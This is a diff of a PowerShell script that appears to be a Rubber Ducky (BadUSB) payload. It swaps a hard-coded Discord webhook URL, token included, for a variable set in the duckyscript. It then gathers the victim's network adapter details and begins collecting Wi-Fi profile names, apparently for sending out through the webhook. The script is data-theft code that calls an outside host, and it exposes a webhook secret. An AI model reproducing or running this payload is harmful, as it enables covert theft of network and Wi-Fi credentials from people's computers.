@@ -8,8 +8,9 @@
 #  #+#+# #+#+#      #+#     #+#        #+#        
 #   ###   ###   ########### ########## ##########
 
-$webhookUrl = "https://discord.com/api/webhooks/1069011168993230930/cGeC4LkDJNsvyA6bUJ4leZUsdBkjjjm2eouS3CIgf7DMwh_MMjG3mWZKMpYP3-suKR4u"
-if (([string]::IsNullOrEmpty("$webhookUrl"))) {exit}
+# the $wh variable is defined in the duckyscript
+
+if (([string]::IsNullOrEmpty("$wh"))) {exit}
 
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 $WLANProfileNames = @()
